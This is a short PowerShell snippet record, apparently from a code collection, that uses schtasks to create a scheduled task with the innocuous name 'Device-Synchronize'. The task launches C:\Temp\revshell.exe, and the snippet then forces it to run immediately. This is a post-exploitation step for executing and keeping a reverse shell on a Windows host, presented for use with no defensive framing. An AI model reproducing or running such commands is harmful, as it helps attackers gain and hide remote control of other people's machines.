---
id: 4d5303ef-544c-4992-8104-c682cf3d288e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.837103+00:00'
updated_at: '2023-04-10T20:37:30.433027+00:00'
---

# Code Snippet 4d5303ef

**Language**: Powershell

```powershell
# Create the scheduled tasks to run once at 00.00
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
# Force run it now !
schtasks /run /tn "Device-Synchronize"
```
